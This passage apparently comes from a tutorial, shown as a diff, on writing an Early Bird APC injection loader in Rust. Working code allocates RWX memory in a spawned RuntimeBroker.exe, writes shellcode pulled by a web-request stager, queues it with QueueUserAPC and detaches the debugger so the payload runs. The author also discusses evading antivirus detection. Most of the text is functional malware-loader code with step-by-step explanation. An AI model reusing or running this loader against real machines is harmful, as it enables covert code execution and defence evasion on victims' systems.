@@ -275,7 +275,7 @@ pub fn write_payload(
             null_mut(),
             s_size_shellcode,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
+            PAGE_EXECUTE_READWRITE,
         ) as *mut u8;
 
         let result = WriteProcessMemory(
@@ -285,15 +285,144 @@ pub fn write_payload(
             s_size_shellcode,
             null_mut(),
         );
-
-        let mut old_protection : DWORD = 0;
-        let success_change_permissions = VirtualProtectEx(
-            h_process as *mut _,
-            *p_payload_address as *mut _,
-            s_size_shellcode,
-            PAGE_EXECUTE_READ,
-            &mut old_protection as *mut DWORD
-        );
     }
+}
+```
+
+Let's dive deeper into each snippet. The first we find is the `VirtualAllocEx` call that will allocate the space on the thread's memory for our payload.
+
+```rust
+*p_payload_address = VirtualAllocEx(
+    h_process as *mut _,
+    null_mut(),
+    s_size_shellcode,
+    MEM_COMMIT | MEM_RESERVE,
+    PAGE_EXECUTE_READWRITE,
+) as *mut u8;
+```
+
+In this call we are passing the `hProcess`, which is our process handle, the size of our payload, the allocation type and the protection flags. This last one is of particular interest, since it sets the page permissions. For now we will set it up as `PAGE_EXECUTE_READWRITE`, which will create a page with `RWX` flags. This is not particulary stealthy and will be flagged by many AV solutions as malicious, but it serves as a starting point for us.
+
+Next in the code we have a snippet that will write the payload in the allocation we have just designated.
+
+```rust
+let result = WriteProcessMemory(
+    h_process as *mut _,
+    *p_payload_address as *mut _,
+    p_shellcode as *const _,
+    s_size_shellcode,
+    null_mut(),
+);
+```
+
+As we can see, this call is quite straight forward, passing all the pointers needed and the sizes.
+
+
+### Execute the payload
+
+Last but not least, I present below the function that will execute our payload:
+
+```rust
+pub fn execute_payload(
+    p_payload_address: *mut *mut u8,
+    h_thread : *mut HANDLE,
+    dw_process_id : DWORD
+    ) {
+    
+    let func : PAPCFUNC = unsafe{
+        Some(
+            std::mem::transmute(
+                unsafe {
+                    *p_payload_address
+                }
+            )
+        )
+    };
+
+    let _ = unsafe {
+        QueueUserAPC(
+            func,
+            *h_thread as *mut winapi::ctypes::c_void,
+            0
+        ) 
+    };
+
+    let _ = unsafe{
+        DebugActiveProcessStop(dw_process_id)
+    };
+
+}
+```
+
+As usual, let's go step by step
+
+```rust
+let func : PAPCFUNC = unsafe{
+    Some(
+        std::mem::transmute(
+            unsafe {
+                *p_payload_address
+            }
+        )
+    )
+};
+```
+As seen when defining the signatures of the functions to be used, `QueueUserAPC` requieres a function pointer, that is, the function that will be queued to execute. To be able to do this, we first need to transform the type of `*p_payload_address` to be a function pointer, and that is exactly what the function is doing.
+
+Next what we need to do is to queue the thread in the `APC` Queue, and that is done with the `QueueUserAPC` API call.
+
+```rust
+let _ = unsafe {
+    QueueUserAPC(
+        func,
+        *h_thread as *mut winapi::ctypes::c_void,
+        0
+    ) 
+};
+```
+
+There is not much to explain here, as we are just passing the arguments the call needs to work.
+
+The last part of the function is quite straight formward as well. Remember we created the proces in a `DEBUG` state? Well, now we need to stop the debugging process and deatach it, so the flow can continue normally and our payload gets executed.
+
+## Writing the `main()`
+
+On the previous sections, we wrote all the necessary code to perform successful APC Injection, but now we need to actually call them in the appropiate sequence with the right arguments on each call. We will do that on our `main()` routine.
+
+```rust
+mod stager;
+mod earlybird;
+use std::ffi::{CString, CStr, c_char, c_void};
+use std::ptr::{null, null_mut};
+use std::io::{self, Write};
+
+pub type HANDLE = *mut c_void;
+pub type DWORD = u32;
+pub type BOOL = i32;
+
+fn main() {
+
+    let mut h_thread : HANDLE = null_mut();
+	let mut dw_process_id : DWORD = 0;
+	let mut h_process : HANDLE = null_mut();
+
+    let payload = stager::winwebrequest();
+    match String::from_utf8(payload.clone()) {
+    Ok(s) => println!("{}", s),
+    Err(e) => println!("Invalid UTF-8: {}", e),
+}
+    let exe = CString::new("RuntimeBroker.exe").unwrap();
+    let ptr: *const c_char = exe.as_ptr();
+
+    let _ = earlybird::create_new_process(ptr, &mut dw_process_id, &mut h_process, &mut h_thread);
+
+
+    let mut p_payload_address : *mut u8 = null_mut();
+
+    let _ = earlybird::write_payload(h_process, payload.as_ptr() as *mut u8, payload.len(), &mut p_payload_address);
+
+
+    let _ = earlybird::execute_payload(&mut p_payload_address, &mut h_thread, dw_process_id);
+   
 }
 ```
